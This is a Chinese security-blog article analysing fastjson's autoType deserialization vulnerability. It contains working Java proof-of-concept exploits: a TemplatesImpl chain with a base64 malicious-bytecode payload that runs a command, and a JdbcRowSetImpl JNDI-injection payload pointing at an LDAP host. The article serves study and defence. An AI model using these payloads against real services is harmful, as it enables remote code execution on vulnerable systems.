#  反序列化漏洞和fastjson实际漏洞分析   
 LemonSec   2024-08-31 14:11  
  
## 简介  
  
FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象分别通过toJSONString和parseObject/parse来实现序列化和反序列化。  
### 使用  
  
对于序列化的方法toJSONString()有多个重载形式。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHp7bn7ancgJkBe8cpOSBjM0PhQW1ex1kib5651rMsNqXAQgQovZRGnwg/640?wx_fmt=jpeg&wxfrom=13&tp=wxpic "")  
1. SerializeFeature: 通过设置多个特性到FastjsonConfig中全局使用, 也可以在使用具体方法中指定特性  
  
1. SerializeFilter: 一个接口, 通过配置它的子接口或者实现类就可以以扩展编程的方式实现定制序列化  
  
1. SerializeConfig: 添加特点类型自定义的序列化配置  
  
对于反序列化的方法parseObject()也同样有多个重载形式。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHmysXXDmQpK7WicbLSoVd9jt5Kz8ptLfUmhuic7Iia1U6T9ltiaWuwYLrdA/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
###### 序列化操作  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHk7ZEhM6iaSAJVHjD7GPxLHzTzEgjARwIT7jZsQFHTrpNvt27ehwWrPw/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
可以发现这两个的区别，如果使用了toJSONString()的属性值SerializerFeature.WriteClassName，就会在序列化的时候多写入一个@type后面跟着的是反序列化的类名。  
###### 反序列化操作  
```
package pers.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class UnSerialTest {
    public static void main(String[] args) {
        String jsonStringWithType = "{\"@type\":\"pers.fastjson.Student\",\"name\":\"RoboTerh\"}";
        String jsonStringWithoutType = "{\"name\":\"RoboTerh\"}";

        System.out.println("use JSON.parse with type......");
        Object o1 = JSON.parse(jsonStringWithType);
        System.out.println(o1);
        System.out.println("------------------------------------");

        System.out.println("use JSON.parse without type....");
        Object o2 = JSON.parse(jsonStringWithoutType);
        System.out.println(o2);
        System.out.println("-------------------------------------");

        System.out.println("use JSON.parseObject with type.......");
        JSONObject o3 = JSON.parseObject(jsonStringWithType);
        System.out.println(o3);
        System.out.println("--------------------------------------");

        System.out.println("use JSON.parseObject without type.........");
        JSONObject o4 = JSON.parseObject(jsonStringWithoutType);
        System.out.println(o4);
        System.out.println("----------------------------------------");

        System.out.println("use JSON.parseObject without type but hava .Class");
        Student o5 = JSON.parseObject(jsonStringWithoutType, Student.class);
        System.out.println(o5);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHzpR2S9joXjsl5la7oY0ia9lGzwXAPL72yCBhK0WqvQ9RpeXia8jAma3Q/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
可以通过结果发现1和5成功反序列化，没成功都是因为没有确定需要反序列化的类。  
  
我们可以发现，在引入了@type之后，JSON.parseObject调用了getter/setter方法，JSON.parse调用了setter方法。  
  
当然，其他的方式也是可以调用getter方法的，但是有条件限制：  
```
条件一、方法名需要长于4

条件二、不是静态方法

条件三、以get字符串开头，且第四个字符需要是大写字母

条件四、方法不能有参数传入

条件五、继承自Collection || Map || AtomicBoolean || AtomicInteger ||AtomicLong

条件六、此getter不能有setter方法（程序会先将目标类中所有的setter加入fieldList列表，因此可以通过读取fieldList列表来判断此类中的getter方法有没有setter）

```  
  
因为fastjson存在autoType机制, 当用户指定@type时, 存在调用恶意setter/getter的情况, 这就是fastjson反序列化漏洞。  
##### 简单的漏洞  
```
//Evil.java
package pers.fastjson;

import java.io.IOException;

public class Evil {
    private String name;

    public Evil () {
        System.out.println("构造方法");
    }
    public void setName(String name) throws IOException {
        this.name = name;
        System.out.println("调用了setName方法");
        Runtime.getRuntime().exec("calc");
    }
    public String getName() {
        System.out.println("调用了getName方法");
        return name;
    }
}

```  
```
//EvilTest.java
package pers.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class EvilTest {
    public static void main(String[] args) {
        String jsonString = "{\"@type\":\"pers.fastjson.Evil\",\"name\":\"RoboTerh\"}";
        JSONObject o = JSON.parseObject(jsonString);
        System.out.println(o);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHTeXsGSfNufn0EAMlE076pYBO56v45BRUoZ0A9NIVCp1JkNibXQxNhzQ/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
成功弹出了计算器，  
  
我们调式分析分析，  
  
在JSON.parseObject处下的断点。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhH4n50vgzLrfQVIZ3URuGl8uW1SeP7qiajosZ67kjkePfEfaUTJMFyUxg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
首先使用了parse()方法进行反序列化操作。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHwYQZ1bRuerfn3MdlxqRcZENLT1ic3VFldvkAwm49hibWvu6ZmvsX4PWA/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
在JSON.parse(String text, int features)创建了DefaultJSONParser对象。![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHNSxBH3QNZHfU6Wp28rflwduTJXH62nkHLMzKuklwqRib7Hu48ze4icQQ/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
在成功创建了该对象之后通过判断ch是{ / [为token赋值，这里是12。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHy8wibgfVpkLic4I6qEME0jyzFRrJTCqCakEdibMR3obCia8SrSkLSraVHg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
在DefaultJSONParser#parse方法中通过判断token的值，进入创建了一个JSONObject对象。  
  
进parseObject方法, 这里会通过scanSymbol获取到@type指定类, 然后通过TypeUtils.loadClass方法加载Class.  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHCYOx5Hy9IjR4IzIVkEHric9fzcRGMicnDWtylOlYY02wyZhBZjAIIy5A/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHgynoT5jTZIjmraTOUp3qCYpqEnPSQ5syYicA1iaqDyOCjPZbN1TLVia0Q/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
先是首先在maping中寻找JDK的内置类，没有找到之后使用ClassLoader寻找，得到clazz的之后进行返回  
  
创建了ObjectDeserializer并且调用了getDeserializer方法。  
##### Templateslmpl利用链  
  
如果一个类中的getter满足调用条件而且存在可利用点，攻击链就产生了。  
  
在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类中就存在一个私有变量_outputProperties，他的getter方法就满足在反序列化的时候的调用条件。  
###### 分析利用链，  
  
从漏洞触发点开始Templateslmpl#getTransletInstance方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHooKrTMyZ1jAialChlmrL1MBQekZwlyZNiaxvbRicDEmR63icvJX3nU7CjA/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
这里通过调用_class[_transletIndex]的newInstance()方法进行实例化操作，我们追踪_class[_transletIndex]的出处，看看是否可以控制，进行恶意操作。  
  
值得注意的是，我们想要达到漏洞点，在getTransletInstance()方法的两个if语句中，我们需要保证他的_name这个私有属性不为空，否则就直接返回了null，而不会达到漏洞点。  
  
在第二个语句中就是通过defineTransletClasses()方法获得了_class和_transletIndex的值，进入它。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHcVzy7I4401f5e1cShmyLcqKaequ7kraAPibNx0XfuJEbJia3uGqGyUZQ/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
首先判断_bytecodes是否为空，这里的_bytecodes同样是Templateslmpl类的成员变量，可控  
  
如果这里不为空的话，就会执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHqF6nbJibOELYm1pP6H6M9gxZjTbDyguqBRMAOHFFOPvHIBiacu9ZFUPQ/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
而且这里如果_tfactory不为空的话，就会导致出现异常，然后返回，不会继续执行程序，我们需要保证它不为null，虽然他也是Templateslmpl类的成员变量，但是他没有对应的setter，我们可以通过Feature.SupportNonPublicField来进行修改。  
  
接着走，在后面有一个for循环，  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHPcUCBU7lHicK0DzD9DCUGZTAZJo4bMQx5yafBmxKiaw9xllHicqEDsjNA/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
通过loader.defineClass修饰之后将_bytecodes[i]赋值给_class[i]，跟进defineClass方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHyQPwM9Yl5zTmIxXRraqbIcGA8d65rYbK5EOp6B8F4Gpox0XwZMfVCA/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
他是ClassLoader的defineClass的重写，作用是将字节码转化为Class，  
  
转回defineTransletClasses，在if判断语句中，如果它是main class的时候我们就为_transletIndex赋值。  
  
现在重新回到getTranslateInstance()方法，现在这里的_class[_translateIndex]就是我们为_bytecodes赋值的恶意class，我们这里将他给实例化了，成功利用恶意类，  
  
现在我们可以知道getTranslateInstance()是可以执行恶意类的，我们搜索在Templateslmpl类中什么调用了这个方法的。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHoTzkEfWqyCxmEBIcG2Zica2sgVX5tVNdPnibguvyDvwCWia1vzq33jXCg/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
可以发现在newTransformer()方法中使用了getTransletInstance()方法。  
  
继续搜索在哪里调用了newTransformer()方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHicy6Gcs1TWKtqG93TvJyJQBMdEaFM7bA0yrzIq9OweRQIroFXTAM3kw/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
在getOutputProperties()方法调用了他，而且这个方法，在反序列化的时候会被调用，现在，这个利用链就完整了。  
```
//利用链
getOutputProperties()
    newTransformer()
    	getTransletInstance()
    		defineTransletClasses()
    	_class[_transletIndex].newInstance()

```  
###### POC  
```
package pers.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.codec.binary.Base64;

import java.io.IOException;

public class Fj24POC {
    public static class RoboTerh {

    }
    public static String makeClasses() throws NotFoundException, CannotCompileException, IOException {

        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(RoboTerh.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "RoboTerh" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        byte[] evilCodes = cc.toBytecode();

        return Base64.encodeBase64String(evilCodes);
    }

    public static String exploitString() throws NotFoundException, CannotCompileException, IOException {
        String evilCodeBase64 = makeClasses();
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String exploit = "{'RoboTerh':{" +
                "\"@type\":\"" + NASTY_CLASS + "\"," +
                "\"_bytecodes\":[\"" + evilCodeBase64 + "\"]," +
                "'_name':'RoboTerh'," +
                "'_tfactory':{ }," +
                "'_outputProperties':{ }" +
                "}}\n";

        return exploit;
    }

    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
        String exploit = exploitString();
        System.out.println(exploit);
        //JSON.parse(exploit, Feature.SupportNonPublicField);
        //JSON.parseObject(exploit, Feature.SupportNonPublicField);
        JSON.parseObject(exploit, Object.class, Feature.SupportNonPublicField);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHIlC3rwqq0ewf60djH2sVxtdISAb6FqPKwslpicY23cKR6QjDhxh4GXw/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
```
//payload
{"RoboTerh":{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhSb2JvVGVyaAEADElubmVyQ2xhc3NlcwEAIExwZXJzL2Zhc3Rqc29uL0ZqMjRQT0MkUmib1Rlcmg7AQAKU291cmNlRmlsZQEADEZqMjRQT0MuamF2YQwABAAFBwATAQAecGVycy9mYXN0anNvbi9GajI0UE9DJFJvYmUZXJoAQAQamF2YS9sYW5nL09iamVjdAEAFXBlcnMvZmFzdGpzb24vRmoyNFBPQwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAFlJvY9UZXJoMjY5OTQ4OTExMjAwMDABABhMUmib1RlcmgyNjk5NDg5MTEyMDAwMDsBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwAjCgAkAA8AIQACACQAAAAAAAIAAQAEAAUAAQAGAAAALwABAAEAAAAFKrcAJbEAAAACAAcAAAAGAAEAAAAPAAgAAAAMAAEAAAAFAAkAIgAAAAgAFAAFAAEABgAAABYAAgAAAAAACrgAGhIctgAgV7EAAAAAAAIADQAAAAIADgALAAAACgABAAIAEAAKAAk="],'_name':'RoboTerh','_tfactory':{ },'_outputProperties':{ }}}

```  
  
条件限制  
  
需要开启Feature.SupportNonPublicField这个特性。  
### JdbcRowSetImpl利用链  
###### 分析利用链  
  
JdbcRowSetImpl类位于com.sun.rowset.JdbcRowSetImpl中，它本身没有实现Serializeble接口，但是他是BaseRowSet类的子类，该类实现了该接口，所以它可以进行序列化。  
  
链子的核心触发点是javax.naming.InitialContext#lookup的参数可控造成的漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHOssU6UicCrUwubnZNPicXCTp14FobPKYzv2qtOtpDexXqPjnHjibc98mQ/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
在JdbcRowSetImpl#setAutoCommit中如果this.conn为空的时候，就会调用this.connect方法。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhH7LyW0AicpaOdzgQfpXZyFicdcqbY9ZgBFxaPw3uTCdPZ6RWaRy0lVSCA/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
然后在connect方法中就会调用Javax.naming.InitialContext#lookup方法，参数是dataSourceName成员变量。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHWZQMMYSP5C15mNrrGW9Z1uicEeR4aVSe2DgMEKuDOstibicEKwlqly1Rw/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
```
//调用链
JdbcRowSetImpl对象
    getDataSource
    	setAutocommit方法
    		context.lookup(datasourcename)

```  
###### POC  
```
package pers.fastjson;

import com.alibaba.fastjson.JSON;

public class Fj24_Jdbc_POC {
    public static void main(String[] args) {
        String payload = "{" +
                "\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                "\"dataSourceName\":\"ldap://127.0.0.1:8888/EvilObject\"," +
                "\"autoCommit\":\"true\"," +
                "}";
        //JSON.parseObject(payload); 成功
        //JSON.parse(payload); 成功
        JSON.parseObject(payload, Object.class);
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/0JJXjA8siccxgCrKrUQEUYECdLk4cPjhHfADiaUw8jDZ8TPGpMrQ0Iiasy515sRYV9jsarqqNicPrZs9YbfMwn1vSQ/640?wx_fmt=jpeg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
```
//payload
{"RoboTerh":{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"ldap://127.0.0.1:8888/evilObject",
	"autoCommit":true
}}

```  
###### 条件限制，  
  
使用了JNDI注入，利用条件相对较低，但是需要连接远程恶意服务器，需要在有网的情况下执行。  
  
本文作者：superLeeH，   
转载请注明来自FreeBuf.COM  
  
**侵权请私聊公众号删文**  
  
  
 **热文推荐******  
  
- [蓝队应急响应姿势之Linux](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523380&idx=1&sn=27acf248b4bbce96e2e40e193b32f0c9&chksm=f9e3f36fce947a79b416e30442009c3de226d98422bd0fb8cbcc54a66c303ab99b4d3f9bbb05&scene=21#wechat_redirect)  
  
  
- [通过DNSLOG回显验证漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523485&idx=1&sn=2825827e55c1c9264041744a00688caf&chksm=f9e3f3c6ce947ad0c129566e5952ac23c990cf0428704df1a51526d8db6adbc47f998ee96eb4&scene=21#wechat_redirect)  
  
  
- [记一次服务器被种挖矿溯源](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523441&idx=2&sn=94c6fae1f131c991d82263cb6a8c820b&chksm=f9e3f32ace947a3cdae52cf4cdfc9169ecf2b801f6b0fc2312801d73846d28b36d4ba47cb671&scene=21#wechat_redirect)  
  
  
- [内网渗透初探 | 小白简单学习内网渗透](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523346&idx=1&sn=4bf01626aa7457c9f9255dc088a738b4&chksm=f9e3f349ce947a5f934329a78177b9ce85e625a36039008eead2fe35cbad5e96a991569d0b80&scene=21#wechat_redirect)  
  
  
- [实战|通过恶意 pdf 执行 xss 漏洞](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523274&idx=1&sn=89290e2b7a8e408ff62a657ef71c8594&chksm=f9e3f491ce947d8702eda190e8d4f7ea2e3721549c27a2f768c3256de170f1fd0c99e817e0fb&scene=21#wechat_redirect)  
  
  
- [免杀技术有一套（免杀方法大集结）(Anti-AntiVirus)](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523189&idx=1&sn=44ea2c9a59a07847e1efb1da01583883&chksm=f9e3f42ece947d3890eb74e4d5fc60364710b83bd4669344a74c630ac78f689b1248a2208082&scene=21#wechat_redirect)  
  
  
- [内网渗透之内网信息查看常用命令](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522979&idx=1&sn=894ac98a85ae7e23312b0188b8784278&chksm=f9e3f5f8ce947cee823a62ae4db34270510cc64772ed8314febf177a7660de08c36bedab6267&scene=21#wechat_redirect)  
  
  
- [关于漏洞的基础知识](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247523083&idx=2&sn=0b162aba30063a4073bad24269a8dc0e&chksm=f9e3f450ce947d4699dfebf0a60a2dade481d8baf5f782350c2125ad6a320f91a2854d027e85&scene=21#wechat_redirect)  
  
  
- [任意账号密码重置的6种方法](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522927&idx=1&sn=075ccdb91ae67b7ad2a771aa1d6b43f3&chksm=f9e3f534ce947c220664a938bc42926bee3ca8d07c6e3129795d7c8977948f060b08c0f89739&scene=21#wechat_redirect)  
  
  
- [干货 | 横向移动与域控权限维持方法总汇](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522810&idx=2&sn=ed65a8c60c45f9af598178ed20c89896&chksm=f9e3f6a1ce947fb710ff77d8fbd721220b16673953b30eba6b10ad6e86924f6b4b9b2a983e74&scene=21#wechat_redirect)  
  
  
- [手把手教你Linux提权](http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&mid=2247522500&idx=2&sn=ec74a21ef0a872f7486ccac6772e0b9a&chksm=f9e3f79fce947e89eac9d9077eee8ce74f3ab35a345b1c2194d11b77d5b522be3b269b326ebf&scene=21#wechat_redirect)  
  
  
  
  
  
**欢迎关注LemonSec**  
  
  
**觉得不错点个“赞”、“在看”**  
  
